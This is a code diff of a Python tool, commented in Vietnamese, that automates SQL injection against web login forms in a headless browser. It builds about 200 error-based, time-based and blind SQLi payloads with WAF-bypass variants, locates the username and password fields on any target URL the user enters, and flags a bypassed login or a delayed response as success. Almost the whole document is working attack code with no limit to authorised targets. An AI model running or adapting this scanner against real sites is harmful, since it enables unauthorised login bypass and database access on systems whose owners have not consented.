@@ -4,74 +4,102 @@ import sys
 import logging
 from playwright.sync_api import sync_playwright, Playwright
 from playwright._impl._errors import TimeoutError
+import random
+import itertools
+from colorama import init, Fore, Style
+from urllib.parse import urlparse
+
+# Khởi tạo colorama
+init()
 
 # Thiết lập logging
 logging.basicConfig(filename='sqli_scan.log', level=logging.INFO, format='%(asctime)s - %(message)s')
 
-# Danh sách payloads SQLi chính
-SQLI_PAYLOADS = [
-    "' OR '1'='1", "' OR 1=1 -- ", "' OR 1=1 #", "admin' OR '1'='1",
-    "1' UNION SELECT NULL, NULL -- ", "' AND SLEEP(5) -- ", "' OR SLEEP(5) -- ",
-    "1' WAITFOR DELAY '0:0:5' -- ", "' AND 1=CONVERT(int,@@version) -- "
+# Danh sách payloads (đã thay thế CONVERT cho MySQL)
+ERROR_BASED_PAYLOADS = [
+    "' OR '1'='1", "admin' OR 1=1 ", "' OR 1=1 -- ", "' OR 1=1 #", "admin' OR '1'='1",
+    "1' UNION SELECT NULL, NULL -- ", "' AND 1=1 /*", "' OR 1=1; --",
+    "' OR 'a'='a", "' OR 1=1 -- -", "' OR 1=1 # -",
+    "' OR 1=CAST(@@version AS SIGNED) -- ", "' UNION SELECT NULL, NULL, NULL -- "  # Thay CONVERT bằng CAST cho MySQL
 ]
 
-# Các biến thể payload để bypass WAF
-WAF_BYPASS_PAYLOADS = {
-    "' AND SLEEP(5) -- ": [
-        "' AND SLEEP(5) -- ",
-        "' and sleep(5) -- ",
-        "' AND SLEEP(5)/*comment*/",
-        "' AND IF(1=1, SLEEP(5), 0) -- ",
-        "' AND SLEEP(5) %2D%2D",
-        "' AND SLEEP(5) --+"
-    ],
-    "' OR SLEEP(5) -- ": [
-        "' OR SLEEP(5) -- ",
-        "' or sleep(5) -- ",
-        "' OR SLEEP(5)/*comment*/",
-        "' OR IF(1=1, SLEEP(5), 0) -- ",
-        "' OR SLEEP(5) %2D%2D",
-        "' OR SLEEP(5) --+"
-    ],
-    "1' WAITFOR DELAY '0:0:5' -- ": [
-        "1' WAITFOR DELAY '0:0:5' -- ",
-        "1' waitfor delay '0:0:5' -- ",
-        "1' WAITFOR DELAY '0:0:5'/*comment*/",
-        "1' IF(1=1, WAITFOR DELAY '0:0:5', 0) -- ",
-        "1' WAITFOR DELAY '0:0:5' %2D%2D",
-        "1' WAITFOR DELAY '0:0:5' --+"
-    ]
-}
-
-# Các lỗi SQL phổ biến để phát hiện SQLi
-SQLI_ERRORS = [
-    "error in your SQL syntax", "mysql_", "SQLSTATE[", "unclosed quotation",
-    "Incorrect syntax near", "sqlite_", "ORA-", "PostgreSQL", "DB2 SQL"
+# Danh sách payloads time-based (dùng SLEEP cho MySQL)
+TIME_BASED_PAYLOADS = [
+    "' AND SLEEP(5) -- ", "' OR SLEEP(5) -- ",
+    "' AND IF(1=1, SLEEP(5), 0) -- ", "' OR IF(1=1, SLEEP(5), 0) -- ",
+] + [
+    f"' AND SLEEP({i}) -- " for i in range(1, 11)
+] + [
+    f"' OR SLEEP({i}) -- " for i in range(1, 11)
 ]
 
-# Các dấu hiệu đăng nhập thành công
-LOGIN_SUCCESS_INDICATORS = [
-    "welcome", "dashboard", "logout", "profile", "success", "logged in"
+BLIND_SQLI_PAYLOADS = [
+    "' AND 1=1", "' AND 1=2", "' AND SUBSTRING((SELECT DATABASE()), 1, 1)='a'",
+    "' AND (SELECT COUNT(*) FROM users)=1", "' AND (SELECT 1)=1",
+    "' AND (SELECT 1)=2", "' AND EXISTS(SELECT * FROM users)",
+    "' AND NOT EXISTS(SELECT * FROM users WHERE id=1)",
+] + [
+    f"' AND SUBSTRING((SELECT @@{var}), 1, 1)='a' -- " for var in ["version", "servername", "database"]
 ]
+
+# Biến thể WAF bypass
+WAF_BYPASS_VARIANTS = [
+    "", " -- ", " #", " /*", " */", " AND ", " OR ", " SLEEP("
+]
+
+# Tạo danh sách payloads với biến thể WAF bypass mà không làm xáo trộn thứ tự
+def generate_payloads_with_waf_variants(payloads):
+    result = []
+    for payload in payloads:
+        for variant in WAF_BYPASS_VARIANTS:
+            result.append(payload + variant)
+    return result
+
+# Tạo payloads theo thứ tự
+ERROR_BASED_PAYLOADS = generate_payloads_with_waf_variants(ERROR_BASED_PAYLOADS)
+TIME_BASED_PAYLOADS = generate_payloads_with_waf_variants(TIME_BASED_PAYLOADS)
+BLIND_SQLI_PAYLOADS = generate_payloads_with_waf_variants(BLIND_SQLI_PAYLOADS)
+
+# Kết hợp payloads theo thứ tự: error-based → time-based → blind
+SQLI_PAYLOADS = ERROR_BASED_PAYLOADS + TIME_BASED_PAYLOADS + BLIND_SQLI_PAYLOADS
+while len(SQLI_PAYLOADS) < 200:
+    SQLI_PAYLOADS.append(f"' AND SLEEP({random.randint(1, 10)}) -- {random.choice(WAF_BYPASS_VARIANTS)}")
+SQLI_PAYLOADS = SQLI_PAYLOADS[:200]  # Giới hạn ở 200 payloads
+
+# Các path liên quan đến đăng nhập thành công
+SUCCESSFUL_PATHS = ["/userinfo.php", "/user", "/account", "/profile"]
 
 # Các dấu hiệu bị WAF chặn
-WAF_INDICATORS = [
-    "forbidden", "blocked", "access denied", "403"
+WAF_INDICATORS = ["403"]
+
+# Từ khóa để xác định lỗi syntax trong nội dung phản hồi
+ERROR_INDICATORS = ["error in your SQL syntax", "SQL error", "mysql_fetch", "mysql_num_rows"]
+
+# Từ khóa để xác định các trường liên quan đến credentials
+CREDENTIAL_KEYWORDS = {
+    "username": ["username", "uname", "user", "login", "name", "usr", "account", "id", "email"],
+    "password": ["password", "pass", "pwd", "pw", "passwd", "secret"],
+    "email": ["email", "mail", "e-mail"]
+}
+
+# Từ khóa để xác định nút submit
+SUBMIT_BUTTON_KEYWORDS = [
+    "login", "signin", "submit", "log in", "sign in", "enter", "access"
 ]
 
 # Biến toàn cục
 stop_scanning = False
-results_found = []
+successful_payloads = []
 
 # Xử lý Ctrl+C
 def signal_handler(sig, frame):
     global stop_scanning
     print("\n[!] Stopping scan...")
     stop_scanning = True
-    if results_found:
+    if successful_payloads:
         with open("sqli_results.txt", "a") as f:
-            for result in results_found:
-                f.write(result + "\n")
+            for result in successful_payloads:
+                f.write(str(result) + "\n")
     sys.exit(0)
 
 signal.signal(signal.SIGINT, signal_handler)
@@ -87,187 +115,254 @@ def scan_initial_paths(target):
         page = context.new_page()
 
         try:
-            page.goto(target, timeout=15000)
+            page.goto(target, timeout=10000)
+            page.wait_for_load_state("domcontentloaded", timeout=10000)
             default_content = page.content()
-            print(f"[*] Default content loaded from {target}")
+            print(f"[*] Default content loaded from {target}: {default_content[:200]}...")
         except TimeoutError:
             print(f"[!] Timeout loading default content from {target}")
-            default_content = ""
             browser.close()
             return valid_paths
 
-        login_paths = ["/login", "/login.php", "/signin", "/auth"]
+        login_paths = ["/", "/login", "/login.php", "/signin", "/auth"]
         for path in login_paths:
             full_url = f"{target.rstrip('/')}{path}"
             try:
-                page.goto(full_url, timeout=15000)
-                content = page.content()
-                if content and ("form" in content.lower() or page.query_selector("form")):
+                page.goto(full_url, timeout=10000)
+                page.wait_for_load_state("domcontentloaded", timeout=10000)
+                if page.query_selector("form") or any(
+                    page.query_selector(f"input[name*='{keyword}']") 
+                    for keyword in itertools.chain(*CREDENTIAL_KEYWORDS.values())
+                ):
                     print(f"[+] Found login path: {path}")
                     valid_paths.append(full_url)
-                else:
-                    print(f"[-] No login form found at {path}")
             except TimeoutError:
                 print(f"[-] Timeout or inaccessible: {path}")
-            except Exception as e:
-                print(f"[-] Error on {path}: {e}")
 
         browser.close()
     return valid_paths
 
-# Hàm kiểm tra SQLi trên form với khả năng bypass WAF
+# Hàm xác định các trường liên quan đến credentials
+def identify_credential_fields(page):
+    credential_fields = {"username": None, "password": None, "email": None}
+    try:
+        inputs = page.query_selector_all("input")
+        print(f"[*] Found {len(inputs)} input fields on the page.")
+        for input_field in inputs:
+            name = input_field.get_attribute("name") or ""
+            input_type = input_field.get_attribute("type") or ""
+            name_lower = name.lower()
+            type_lower = input_type.lower()
+            for field_type, keywords in CREDENTIAL_KEYWORDS.items():
+                for keyword in keywords:
+                    if keyword in name_lower and (field_type != "password" or type_lower == "password") and (field_type != "email" or type_lower == "email"):
+                        selector = f"input[name='{name}']"
+                        credential_fields[field_type] = selector
+                        print(f"[+] Identified {field_type} field: {selector}")
+                        break
+    except Exception as e:
+        print(f"[!] Error identifying credential fields: {e}")
+    return credential_fields
+
+# Hàm xác định nút submit
+def identify_submit_button(page):
+    try:
+        for keyword in SUBMIT_BUTTON_KEYWORDS:
+            selector = f"button[type='submit'], input[type='submit'][value*='{keyword.lower()}']"
+            button = page.query_selector(selector)
+            if button and button.is_visible() and button.is_enabled():
+                print(f"[+] Identified submit button: {selector}")
+                return selector
+        print(f"[!] No submit button found with known keywords.")
+        return None
+    except Exception as e:
+        print(f"[!] Error identifying submit button: {e}")
+        return None
+
+# Hàm kiểm tra SQLi trên form
 def exploit_sqli(playwright, url):
     global stop_scanning
     browser = None
+    results = []
     try:
         browser = playwright.chromium.launch(headless=True)
-        context = browser.new_context(
-            ignore_https_errors=True,
-            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-            extra_http_headers={
-                "Referer": url,
-                "Accept": "text/html",
-                "X-Requested-With": "XMLHttpRequest",
-                "Sec-Fetch-Site": "same-origin",
-                "Sec-Fetch-Mode": "navigate",
-                "Sec-Fetch-Dest": "document"
-            }
-        )
+        context = browser.new_context(ignore_https_errors=True)
         page = context.new_page()
 
-        for sqli_payload in SQLI_PAYLOADS:
-            print(f"[*] Testing SQLi with payload: {sqli_payload} on {url}...")
-            # Nếu payload có biến thể để bypass WAF, lấy danh sách biến thể
-            payloads_to_test = WAF_BYPASS_PAYLOADS.get(sqli_payload, [sqli_payload])
+        last_response = None
+        def handle_response(response):
+            nonlocal last_response
+            last_response = response
 
-            for payload in payloads_to_test:
-                # Retry logic cho mỗi payload
-                for attempt in range(3):
-                    try:
-                        print(f"[*] Opening Chrome to login at {url} (Attempt {attempt + 1}/3) with payload: {payload}...")
-                        page.goto(url, timeout=30000)
-                        page.wait_for_load_state("networkidle", timeout=30000)
-                        print(f"[*] Page loaded successfully (Attempt {attempt + 1}/3)")
+        page.on("response", handle_response)
+
+        for attempt in range(3):
+            try:
+                page.goto(url, timeout=10000)
+                page.wait_for_load_state("domcontentloaded", timeout=10000)
+                break
+            except TimeoutError:
+                if attempt == 2:
+                    print(f"[!] Failed to load {url} after 3 attempts, skipping...")
+                    return []
+                time.sleep(1)
+
+        credential_fields = identify_credential_fields(page)
+        if not any(credential_fields.values()):
+            print(f"[!] No credential-related fields found on {url}. Skipping...")
+            return []
+
+        submit_selector = identify_submit_button(page)
+        if not submit_selector:
+            print(f"[!] No submit button found on {url}. Skipping...")
+            return []
+
+        print(f"[*] Testing {len(SQLI_PAYLOADS)} payloads on all fields...")
+        for field_type, selector in credential_fields.items():
+            if not selector:
+                continue
+            print(f"[*] Testing all payloads on {field_type} field: {selector} (Field type: {field_type})")
+            for payload_type, payloads, color in [
+                ("Error-based", ERROR_BASED_PAYLOADS, Fore.RED),
+                ("Time-based", TIME_BASED_PAYLOADS, Fore.YELLOW),
+                ("Blind SQLi", BLIND_SQLI_PAYLOADS, Fore.CYAN)
+            ]:
+                for payload in payloads:
+                    if stop_scanning:
                         break
-                    except TimeoutError:
-                        print(f"[!] Timeout loading {url} (Attempt {attempt + 1}/3)")
-                        if attempt == 2:
-                            print(f"[!] Failed to load {url} after 3 attempts, skipping payload {payload}")
+                    print(f"[*] Testing {payload_type} payload: {color}{payload}{Style.RESET_ALL}")
+                    try:
+                        page.goto(url, timeout=10000)
+                        page.wait_for_load_state("domcontentloaded", timeout=10000)
+                        page.fill(selector, payload)
+
+                        # Điền password123 vào trường password nếu tồn tại
+                        if "password" in credential_fields and credential_fields["password"]:
+                            page.fill(credential_fields["password"], "password123")
+
+                        submit_button = page.wait_for_selector(submit_selector, state="visible", timeout=5000)
+                        if not submit_button or not submit_button.is_enabled():
+                            print(f"[!] Submit button {submit_selector} not visible or enabled for {color}{payload}{Style.RESET_ALL}")
                             continue
-                        time.sleep(2)
-                    except Exception as e:
-                        print(f"[!] Error loading page (Attempt {attempt + 1}/3): {e}")
-                        if attempt == 2:
-                            print(f"[!] Failed to load {url} after 3 attempts, skipping payload {payload}")
+
+                        start_time = time.time()
+                        submit_button.click()
+                        # Chỉ chờ redirect, không cần render nội dung
+                        page.wait_for_load_state("domcontentloaded", timeout=10000)
+                        elapsed_time = time.time() - start_time
+
+                        # Debug: In URL sau khi submit
+                        current_url = page.url
+                        print(f"[DEBUG] URL after submit: {current_url}")
+                        # Lấy phần path từ URL để so sánh
+                        parsed_url = urlparse(current_url)
+                        current_path = parsed_url.path.lower().strip()
+                        print(f"[DEBUG] Parsed path: {current_path}")
+                        # Debug: Kiểm tra điều kiện so sánh
+                        path_match = any(path == current_path for path in SUCCESSFUL_PATHS)
+                        print(f"[DEBUG] Path match result: {path_match} (Comparing {current_path} with {SUCCESSFUL_PATHS})")
+                        status = last_response.status if last_response else 200
+
+                        # Khởi tạo biến is_successful
+                        is_successful = False
+                        print(f"[DEBUG] Is successful before check: {is_successful}")
+
+                        if status == 403 or "403" in str(status):
+                            print(f"[-] WAF detected with {color}{payload}{Style.RESET_ALL} (Status: {status})")
                             continue
-                        time.sleep(2)
 
-                # Kiểm tra và điền dữ liệu
-                try:
-                    print(f"[*] Waiting for form elements on {url}...")
-                    username_input = page.wait_for_selector("input[name='username']", state="visible", timeout=15000)
-                    password_input = page.wait_for_selector("input[name='password']", state="visible", timeout=15000)
-                    submit_button = page.wait_for_selector("button[type='submit']", state="visible", timeout=15000)
-                    print(f"[*] Form elements found: username={username_input is not None}, password={password_input is not None}, submit={submit_button is not None}")
+                        # Kiểm tra nội dung phản hồi để phát hiện lỗi syntax
+                        page_content = page.content().lower()
+                        has_syntax_error = any(error_indicator in page_content for error_indicator in ERROR_INDICATORS)
+                        print(f"[DEBUG] Has syntax error in response: {has_syntax_error}")
 
-                    # Xử lý phản hồi để lấy mã trạng thái
-                    response = None
-                    def handle_response(resp):
-                        nonlocal response
-                        response = resp
-
-                    page.on("response", handle_response)
-
-                    print(f"[*] Entering payload: {payload}...")
-                    page.fill("input[name='username']", payload)
-                    page.fill("input[name='password']", "password123")
-                    print(f"[*] Submitting form...")
-                    
-                    # Đo thời gian submit
-                    start_time = time.time()
-                    page.click("button[type='submit']")
-                    page.wait_for_load_state("networkidle", timeout=10000)
-                    elapsed_time = time.time() - start_time
-
-                    # Kiểm tra mã trạng thái HTTP
-                    if response:
-                        status = response.status
-                        print(f"[*] HTTP Status: {status}")
-                        if status == 403:
-                            print(f"[!] WAF detected: Forbidden (Payload: {payload})")
-                            continue  # Thử payload khác trong danh sách biến thể
-
-                    # Kiểm tra nội dung phản hồi
-                    content = page.content().lower()
-                    if any(indicator in content for indicator in WAF_INDICATORS):
-                        print(f"[!] WAF detected: Content indicates block (Payload: {payload})")
-                        continue  # Thử payload khác trong danh sách biến thể
-
-                    # Kiểm tra các dấu hiệu SQLi
-                    if any(error in content for error in SQLI_ERRORS):
-                        result = f"[!!!] SQLi found with {payload} at {url} (Error-based)"
-                        print(result)
-                        results_found.append(result)
-                        logging.info(result)
-                        return True
-                    elif any(indicator in content for indicator in LOGIN_SUCCESS_INDICATORS):
-                        result = f"[!!!] SQLi found with {payload} at {url} (Bypass login)"
-                        print(result)
-                        results_found.append(result)
-                        logging.info(result)
-                        return True
-                    elif "SLEEP" in payload or "DELAY" in payload:
-                        if elapsed_time >= 4:  # Delay đáng kể
-                            result = f"[!!!] SQLi found with {payload} at {url} (Time-based) (Response time: {elapsed_time}s)"
+                        # Kiểm tra path để phát hiện đăng nhập thành công
+                        if path_match and not has_syntax_error:  # Chỉ ghi nhận nếu không có lỗi syntax
+                            # Dùng màu xanh lá cho payload khi SQLi found
+                            result = f"[!!!] SQLi found with {Fore.GREEN}{payload}{Style.RESET_ALL} at {url} (Bypass login, Field: {field_type})"
+                            results.append(result)
                             print(result)
-                            results_found.append(result)
-                            logging.info(result)
-                            return True
+                            successful_payloads.append({
+                                "type": payload_type, "payload": payload, "url": url, "field": field_type, "method": "Bypass login"
+                            })
+                            is_successful = True
+                            print(f"[DEBUG] Successfully recorded SQLi for {payload}")
+                        elif ("SLEEP" in payload) and elapsed_time >= 4 and not has_syntax_error:
+                            # Dùng màu xanh lá cho payload khi SQLi found
+                            result = f"[!!!] SQLi found with {Fore.GREEN}{payload}{Style.RESET_ALL} at {url} (Time-based, Field: {field_type}) (Response time: {elapsed_time}s)"
+                            results.append(result)
+                            print(result)
+                            successful_payloads.append({
+                                "type": "Time-based", "payload": payload, "url": url, "field": field_type, "method": "Time-based"
+                            })
+                            is_successful = True
+                            print(f"[DEBUG] Successfully recorded time-based SQLi for {payload}")
                         else:
-                            print(f"[-] No delay detected (Response time: {elapsed_time}s)")
+                            if has_syntax_error:
+                                print(f"[*] Payload {color}{payload}{Style.RESET_ALL} caused a syntax error but redirected to {current_path}")
+                            else:
+                                print(f"[*] Payload {color}{payload}{Style.RESET_ALL} failed on {url} (Field: {field_type})")
 
-                except TimeoutError as e:
-                    print(f"[!] Timeout waiting for form elements: {e}")
-                    continue
-                except Exception as e:
-                    print(f"[!] Error processing form: {e}")
-                    continue
+                    except TimeoutError as e:
+                        print(f"[!] Timeout with {color}{payload}{Style.RESET_ALL}: {e}")
+                        continue
+                    except Exception as e:
+                        print(f"[!] Error with {color}{payload}{Style.RESET_ALL}: {e}")
+                        continue
 
-        return False
-
-    except Exception as e:
-        print(f"[!] Error testing SQLi on {url}: {e}")
-        return False
+        return results
     finally:
         if browser:
             browser.close()
 
-# Hàm quét tự động
-def auto_exploit(target, paths, max_time=600):
+# Hàm quét tự động và tổng hợp kết quả
+def auto_exploit(target, paths, max_time=300):
     global stop_scanning
     start_time = time.time()
-    print(f"\n[*] Starting SQLi scan on {target} (Max time: {max_time}s)...")
+    print(f"\n[*] Starting SQLi scan on {target} (Max time: {max_time}s, Total payloads: {len(SQLI_PAYLOADS)})...")
+    all_results = []
 
     with sync_playwright() as playwright:
         for path in paths:
             if stop_scanning or time.time() - start_time > max_time:
                 break
             print(f"\n[*] Testing path: {path}")
-            exploit_sqli(playwright, path)
+            results = exploit_sqli(playwright, path)
+            all_results.extend(results)
 
-    if results_found:
+    if all_results or successful_payloads:
+        print("\n[!!!] SQLi Scan Results (Detailed Payload Testing):")
+        for result in all_results:
+            print(result)
+
+        print("\n[!!!] Successful Payloads Summary:")
+        if successful_payloads:
+            print(f"{'Type':<15} {'Payload':<40} {'URL':<40} {'Field':<15} {'Method':<15}")
+            print("-" * 125)
+            for success in successful_payloads:
+                print(f"{success['type']:<15} {success['payload']:<40} {success['url']:<40} {success['field']:<15} {success['method']:<15}")
+        else:
+            print("[!] No successful payloads found.")
         with open("sqli_results.txt", "a") as f:
-            for result in results_found:
+            for result in all_results:
                 f.write(result + "\n")
+            if successful_payloads:
+                f.write("\n[!!!] Successful Payloads Summary:\n")
+                f.write(f"{'Type':<15} {'Payload':<40} {'URL':<40} {'Field':<15} {'Method':<15}\n")
+                f.write("-" * 125 + "\n")
+                for success in successful_payloads:
+                    f.write(f"{success['type']:<15} {success['payload']:<40} {success['url']:<40} {success['field']:<15} {success['method']:<15}\n")
+    else:
+        print("[!] No SQLi vulnerabilities found.")
 
 # Menu chính
 def scan_sqli_and_continue():
     global stop_scanning
     while True:
         stop_scanning = False
-        results_found.clear()
+        successful_payloads.clear()
 
-        target_url = input("Enter target URL to scan for SQLi (e.g., https://example.com/): ")
+        target_url = input("Enter target URL to scan for SQLi: ")
         valid_paths = scan_initial_paths(target_url)
         
         if valid_paths:
@@ -284,5 +379,5 @@ def scan_sqli_and_continue():
             sys.exit(0)
 
 if __name__ == "__main__":
-    print("=== SQL Injection Scanner (Playwright Automation with Extended Payloads) ===")
+    print("=== SQL Injection Scanner ===")
     scan_sqli_and_continue()
